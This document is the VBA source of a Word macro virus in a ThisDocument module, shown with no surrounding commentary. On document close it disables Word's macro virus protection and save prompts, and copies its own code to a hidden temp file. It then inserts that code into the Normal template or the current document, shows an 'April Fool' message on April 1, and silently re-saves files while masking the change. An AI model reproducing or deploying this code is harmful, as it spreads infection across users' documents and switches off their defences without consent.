   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
       On Error Resume Next
       s = ActiveDocument.Saved
       Application.EnableCancelKey = Not -1
       With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
       If Dir("c:\temp\~msd13.tmp", 6) = "" Then
           Open "c:\temp\~msd13.tmp" For Output As #1
           For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
               a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
               Print #1, a
           Next i
           Close #1
       SetAttr "c:\temp\~msd13.tmp", 6
       End If
       If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
       Set t = NormalTemplate.VBProject.VBComponents.Item(1)
       ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
       Set t = ActiveDocument.VBProject.VBComponents.Item(1)
       Else
       t = ""
       End If
       If t <> "" Then
       Open "c:\temp\~msd13.tmp" For Input As #1
       If LOF(1) = 0 Then GoTo q
       i = 1
       Do While Not EOF(1)
       Line Input #1, a
       t.CodeModule.InsertLines i, a
       i = i + 1
       Loop
   q:
       Close #1
       If Day(Now) = 1 And Month(Now) = 4 Then MsgBox "You're An April Fool!!!", 48, "April Fool"
       If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       End If
       If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
   End Sub
